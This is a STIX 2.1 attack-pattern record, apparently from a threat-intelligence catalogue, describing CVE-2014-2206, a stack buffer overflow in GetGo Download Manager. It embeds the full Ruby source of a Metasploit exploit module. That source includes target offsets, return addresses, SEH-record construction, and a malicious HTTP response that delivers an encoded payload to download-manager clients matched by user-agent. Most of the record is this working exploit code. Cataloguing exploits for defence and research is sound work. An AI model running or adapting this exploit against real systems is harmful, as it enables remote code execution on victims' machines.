{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--98757b71-3b44-481e-aa8c-54603ab86683",
    "created": "2024-08-14T16:42:39.267336Z",
    "modified": "2024-08-14T16:42:39.26734Z",
    "name": "GetGo Download Manager HTTP Response Buffer Overflow",
    "description": " This module exploits a stack-based buffer overflow vulnerability in GetGo Download Manager version 5.3.0.2712 earlier, caused by an overly long HTTP response header.  By persuading the victim to download a file from a malicious server, a remote attacker could execute arbitrary code on the system or cause the application to crash. This module has been tested successfully on Windows XP SP3.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/getgodm_http_response_bof.rb",
            "external_id": "getgodm_http_response_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-2206"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Seh\n  include Msf::Exploit::Remote::HttpServer\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'GetGo Download Manager HTTP Response Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack-based buffer overflow vulnerability in\n        GetGo Download Manager version 5.3.0.2712 earlier, caused by an\n        overly long HTTP response header.\n\n        By persuading the victim to download a file from a malicious server, a\n        remote attacker could execute arbitrary code on the system or cause\n        the application to crash. This module has been tested successfully on\n        Windows XP SP3.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Julien Ahrens',  # Vulnerability discovery\n          'Gabor Seljan',   # Metasploit module for v4\n          'bzyo',           # Metasploit module for v5\n          'sinn3r'          # Helping Gabor and bzyo (see #4588 & #9642)\n        ],\n      'References'     =>\n        [\n          [ 'EDB', '32132' ],\n          [ 'OSVDB', '103910' ],\n          [ 'CVE', '2014-2206' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n          'URIPATH'      => \"/shakeitoff.mp3\"\n        },\n      'Platform'       => 'win',\n      'Payload'        =>\n        {\n          # v5 has no bad chars\n          'BadChars'   => \"\\x00\\x0a\\x0d\"\n        },\n      'Targets'        =>\n        [\n          [\n            'Automatic', {}\n          ],\n          [ '4.9.0.1982 on Windows XP SP3',\n            {\n              'Offset' => 4107,\n              'Ret'    => 0x00280b0b  # CALL DWORD PTR SS:[EBP+30]\n            }\n          ],\n          [\n            '5.3.0.2712 on Windows XP SP3',\n            {\n              'Offset'  => 4095,\n              # 0:016> u 0x72d11f39\n              # msacm32!wodMessage+0xd0f:\n              # 72d11f39 5f              pop     edi\n              # 72d11f3a 5e              pop     esi\n              # 72d11f3b c20400          ret     4\n              'Ret'     => 0x72d11f39,\n              # 12253 is the same size the python PoC used\n              'MaxSize' => 12253\n            }\n          ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2014-03-09',\n      'DefaultTarget'  => 0))\n  end\n\n  # This part is from Gabor Seljan\n  def exploit_v4(cli, current_taget)\n    sploit  = rand_text_alpha(current_taget['Offset'])\n    sploit << \"\\x90\\x90\\xEB\\x06\"\n    sploit << [current_taget.ret].pack('V')\n    sploit << payload.encoded\n\n    print_status(\"Sending #{sploit.length} bytes to port #{cli.peerport}...\")\n\n    resp = create_response(200, sploit)\n    resp.body = \"\"\n    cli.send_response(resp)\n  end\n\n  # This part is from Auxilus with some help from @_sinn3r\n  def exploit_v5(cli, current_taget)\n    seh_record = generate_seh_record(current_taget.ret)\n    # Minus 4 for the SEH record\n    buffer = Rex::Text.rand_text_alpha(current_taget['Offset'] - 4)\n    buffer << seh_record\n    buffer << payload.encoded\n    buffer << Rex::Text.rand_text_alpha(current_taget['MaxSize'] - buffer.length)\n    res = create_response(200, buffer)\n    cli.send_response(res)\n  end\n\n  def on_request_uri(cli, request)\n    print_status(\"#{cli.peerhost} connected\")\n    current_target = target\n    user_agent = request.headers['User-Agent'].to_s\n\n    if current_target == targets[1] || user_agent.match(/GetGo Download Manager 4\\.0/)\n      print_status('Attempting to exploit against v4')\n      current_target = targets[1]\n      exploit_v4(cli, current_target)\n    elsif current_target == targets[2] || user_agent.match(/GetGo Download Manager 5\\.0/)\n      print_status('Attempting to exploit against v5')\n      current_target = targets[2]\n      exploit_v5(cli, current_target)\n    else\n      print_error('Sending 404 for unknown user-agent')\n      send_not_found(cli)\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-03-09",
    "x_mitre_platforms": [
        "win'"
    ]
}